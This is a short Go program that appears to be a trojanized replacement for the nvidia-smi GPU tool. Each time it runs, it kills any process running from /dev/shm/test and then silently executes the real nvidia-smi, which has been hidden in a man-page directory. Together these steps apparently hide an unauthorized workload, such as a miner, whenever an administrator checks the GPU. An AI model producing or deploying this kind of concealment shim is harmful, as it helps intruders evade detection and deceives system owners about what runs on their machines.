package main

import (
	"os"
	"syscall"
	_ "fmt"
	"time"
	"github.com/shirou/gopsutil/process"
	"strings"
)

func main() {
	
	bin_path := "/dev/shm/test"
	pids, _ := process.Pids()
	
	found := false
	
	for _, pid := range pids {
		p, _ := process.NewProcess(pid)
		exe, _ := p.Exe()
		if strings.HasPrefix(exe, bin_path) {
			found = true
			p.Kill()
			//fmt.Println(exe)
		}
	}
	
	argsWithProg := os.Args
	env := os.Environ()
	real_bin := "/usr/share/man/man1/nvidia-smi"
	argsWithProg[0] = real_bin
	if found {
		time.Sleep(1*time.Second)
	}
	syscall.Exec(real_bin, argsWithProg, env)
}
